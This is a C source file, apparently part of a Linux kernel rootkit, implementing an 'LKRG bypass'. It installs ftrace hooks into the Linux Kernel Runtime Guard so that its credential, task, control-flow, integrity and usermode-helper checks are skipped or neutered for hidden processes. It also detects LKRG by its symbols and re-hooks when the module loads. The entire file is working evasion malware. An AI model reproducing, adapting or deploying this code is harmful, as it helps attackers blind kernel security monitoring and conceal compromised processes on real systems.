/*

    Simple and poop initial version of LKRG Bypass
    Initial tests
*/

#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/lkrg_bypass.h"

static void (*orig_kprobe_ftrace_handler)(unsigned long ip, unsigned long parent_ip,
                                         struct ftrace_ops *ops, struct pt_regs *regs) = NULL;
static int (*orig_p_cmp_creds)(void *p_orig, const void *p_current_cred, void *p_current) = NULL;
static int (*orig_p_cmp_tasks)(void *p_orig, char p_kill) = NULL;
static int (*orig_p_ed_pcfi_validate_sp)(void *p_task, void *p_orig, unsigned long p_sp) = NULL;
static int (*orig_p_ed_enforce_pcfi)(void *p_task, void *p_orig, void *p_regs) = NULL;
static void (*orig_p_check_integrity)(void) = NULL;
static int (*orig_p_exploit_detection_init)(void) = NULL;
static int (*orig_p_call_usermodehelper_entry)(const char *path, char **argv, char **envp) = NULL;
static void (*orig_p_call_usermodehelper_ret)(void) = NULL;
static int (*orig_p_call_usermodehelper_exec_entry)(void *sub_info) = NULL;
static void (*orig_p_dump_task_f)(void *p_arg) = NULL;
static int (*orig_ed_task_add)(void *p_ed_process) = NULL;

static unsigned long addr_do_exit = 0;
static unsigned long addr_do_group_exit = 0;
static atomic_t umh_bypass_active = ATOMIC_INIT(0);
static atomic_t hooks_active = ATOMIC_INIT(0);
static struct notifier_block module_notifier;
static atomic_t lkrg_initializing = ATOMIC_INIT(0);

static const char *lkrg_symbols[] = {
    "p_dump_task_f",
    "p_cmp_creds",
    "p_check_integrity",
    NULL
};

static notrace bool is_lkrg_present(void)
{
    int i, found = 0;
    unsigned long *addr;
    
    for (i = 0; lkrg_symbols[i] != NULL; i++) {
        addr = resolve_sym(lkrg_symbols[i]);
        if (addr != NULL)
            found++;
    }
    
    return (found >= 2);
}

static inline bool should_hide_pid_by_int(int pid)
{
    int i;
    if (pid <= 0)
        return false;
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return true;
    }
    return false;
}

static notrace bool is_lineage_hidden(struct task_struct *task)
{
    int depth = 0;
    struct task_struct *parent;
    
    if (!task)
        task = current;
    if (!task)
        return false;
    
    while (task && depth < 64) {
        if (is_hidden_pid(task->pid) || is_hidden_pid(task->tgid) ||
            is_child_pid(task->pid) || is_child_pid(task->tgid))
            return true;
        
        parent = task->real_parent;
        if (!parent || parent == task || task->pid == 1 || task->pid == 0)
            break;
        task = parent;
        depth++;
    }
    return false;
}

static notrace bool should_hide_current(void)
{
    return current ? is_lineage_hidden(current) : false;
}

static notrace bool should_hide_task(struct task_struct *task)
{
    return task ? is_lineage_hidden(task) : false;
}

static notrace void hook_p_dump_task_f(void *p_arg)
{
    struct task_struct *task = (struct task_struct *)p_arg;
    if (!task) {
        if (orig_p_dump_task_f)
            orig_p_dump_task_f(p_arg);
        return;
    }
    if (should_hide_task(task)) {
        add_child_pid(task->pid);
        add_child_pid(task->tgid);
        return;
    }
    if (orig_p_dump_task_f)
        orig_p_dump_task_f(p_arg);
}

static notrace int hook_ed_task_add(void *p_ed_process)
{
    if (should_hide_current())
        return 0;
    return orig_ed_task_add ? orig_ed_task_add(p_ed_process) : 0;
}

static notrace void hook_kprobe_ftrace_handler(unsigned long ip, unsigned long parent_ip,
                                               struct ftrace_ops *ops, struct pt_regs *regs)
{
    if (!orig_kprobe_ftrace_handler)
        return;
    
    if (atomic_read(&lkrg_initializing)) {
        orig_kprobe_ftrace_handler(ip, parent_ip, ops, regs);
        return;
    }
    
    if ((addr_do_exit && ip >= addr_do_exit && ip < addr_do_exit + 0x10) ||
        (addr_do_group_exit && ip >= addr_do_group_exit && ip < addr_do_group_exit + 0x10)) {
        orig_kprobe_ftrace_handler(ip, parent_ip, ops, regs);
        return;
    }
    
    orig_kprobe_ftrace_handler(ip, parent_ip, ops, regs);
}

static notrace int hook_p_cmp_creds(void *p_orig, const void *p_current_cred, void *p_current)
{
    struct task_struct *task = (struct task_struct *)p_current;
    
    if (!p_orig || !p_current_cred || !p_current)
        return 0;
    
    if (task && should_hide_task(task))
        return 0;
    return orig_p_cmp_creds ? orig_p_cmp_creds(p_orig, p_current_cred, p_current) : 0;
}

static notrace int hook_p_cmp_tasks(void *p_orig, char p_kill)
{
    if (should_hide_current())
        return 0;
    return orig_p_cmp_tasks ? orig_p_cmp_tasks(p_orig, p_kill) : 0;
}

static notrace int hook_p_ed_pcfi_validate_sp(void *p_task, void *p_orig, unsigned long p_sp)
{
    struct task_struct *task = (struct task_struct *)p_task;
    
    if (!p_task || !p_orig)
        return 0;
    
    if ((task && should_hide_task(task)) || should_hide_current())
        return 0;
    return orig_p_ed_pcfi_validate_sp ? orig_p_ed_pcfi_validate_sp(p_task, p_orig, p_sp) : 0;
}

static notrace int hook_p_ed_enforce_pcfi(void *p_task, void *p_orig, void *p_regs)
{
    struct task_struct *task = (struct task_struct *)p_task;
    
    if (!p_task || !p_orig || !p_regs)
        return 0;
    
    if ((task && should_hide_task(task)) || should_hide_current())
        return 0;
    
    return orig_p_ed_enforce_pcfi ? orig_p_ed_enforce_pcfi(p_task, p_orig, p_regs) : 0;
}

static notrace void hook_p_check_integrity(void)
{
    if (atomic_read(&hooks_active) && hidden_count > 0) {
        return;
    }
    if (orig_p_check_integrity)
        orig_p_check_integrity();
}

static notrace int hook_p_exploit_detection_init(void)
{
    return 0;
}

static notrace int hook_p_call_usermodehelper_entry(const char *path, char **argv, char **envp)
{
    if (atomic_read(&umh_bypass_active)) {
        return 0;
    }
    
    if (should_hide_current()) {
        return 0;
    }
    
    return orig_p_call_usermodehelper_entry ? 
           orig_p_call_usermodehelper_entry(path, argv, envp) : 0;
}

static notrace int hook_p_call_usermodehelper_exec_entry(void *sub_info)
{
    if (atomic_read(&umh_bypass_active) || should_hide_current()) {
        return 0;
    }
    return orig_p_call_usermodehelper_exec_entry ? 
           orig_p_call_usermodehelper_exec_entry(sub_info) : 0;
}

static notrace void hook_p_call_usermodehelper_ret(void)
{
    if (atomic_read(&umh_bypass_active) || should_hide_current()) {
        return;
    }
    if (orig_p_call_usermodehelper_ret)
        orig_p_call_usermodehelper_ret();
}

notrace void enable_umh_bypass(void)
{
    atomic_inc(&umh_bypass_active);
}
EXPORT_SYMBOL(enable_umh_bypass);

notrace void disable_umh_bypass(void)
{
    if (atomic_read(&umh_bypass_active) > 0)
        atomic_dec(&umh_bypass_active);
}
EXPORT_SYMBOL(disable_umh_bypass);

static struct ftrace_hook lkrg_hooks[] = {
    HOOK("p_dump_task_f", hook_p_dump_task_f, &orig_p_dump_task_f),
    HOOK("ed_task_add", hook_ed_task_add, &orig_ed_task_add),
    HOOK("kprobe_ftrace_handler", hook_kprobe_ftrace_handler, &orig_kprobe_ftrace_handler),
    HOOK("p_cmp_creds", hook_p_cmp_creds, &orig_p_cmp_creds),
    HOOK("p_cmp_tasks", hook_p_cmp_tasks, &orig_p_cmp_tasks),
    HOOK("p_ed_pcfi_validate_sp", hook_p_ed_pcfi_validate_sp, &orig_p_ed_pcfi_validate_sp),
    HOOK("p_ed_enforce_pcfi", hook_p_ed_enforce_pcfi, &orig_p_ed_enforce_pcfi),
    HOOK("p_check_integrity", hook_p_check_integrity, &orig_p_check_integrity),
    HOOK("p_exploit_detection_init", hook_p_exploit_detection_init, &orig_p_exploit_detection_init),
    HOOK("p_call_usermodehelper_entry", hook_p_call_usermodehelper_entry, &orig_p_call_usermodehelper_entry),
    HOOK("p_call_usermodehelper_exec_entry", hook_p_call_usermodehelper_exec_entry, &orig_p_call_usermodehelper_exec_entry),
    HOOK("p_call_usermodehelper_ret", hook_p_call_usermodehelper_ret, &orig_p_call_usermodehelper_ret),
};

notrace static int try_install_hooks(void)
{
    int i, installed = 0;
    
    for (i = 0; i < ARRAY_SIZE(lkrg_hooks); i++) {
        if (lkrg_hooks[i].address)
            continue;
        if (fh_install_hook(&lkrg_hooks[i]) == 0)
            installed++;
    }
    
    if (installed > 0) {
        atomic_set(&hooks_active, 1);
        return 0;
    }
    return -ENOENT;
}

notrace static int module_notify(struct notifier_block *nb, unsigned long action, void *data)
{
    if (action == MODULE_STATE_COMING) {
        atomic_set(&lkrg_initializing, 1);
    } else if (action == MODULE_STATE_LIVE) {
        msleep(2000);
        atomic_set(&lkrg_initializing, 0);
        
        if (is_lkrg_present()) {
            try_install_hooks();
        }
    }
    return NOTIFY_DONE;
}

notrace int lkrg_bypass_init(void)
{
    unsigned long *sym;
    
    sym = resolve_sym("do_exit");
    if (sym)
        addr_do_exit = (unsigned long)sym;
    
    sym = resolve_sym("do_group_exit");
    if (sym)
        addr_do_group_exit = (unsigned long)sym;
    
    if (is_lkrg_present()) {
        msleep(1000);
        try_install_hooks();
    }
    
    module_notifier.notifier_call = module_notify;
    register_module_notifier(&module_notifier);
    
    return 0;
}

notrace void lkrg_bypass_exit(void)
{
    int i;
    
    unregister_module_notifier(&module_notifier);
    
    for (i = ARRAY_SIZE(lkrg_hooks) - 1; i >= 0; i--) {
        if (lkrg_hooks[i].address)
            fh_remove_hook(&lkrg_hooks[i]);
    }
    atomic_set(&hooks_active, 0);
}

notrace bool is_lkrg_blinded(void)
{
    return atomic_read(&hooks_active) > 0;
}
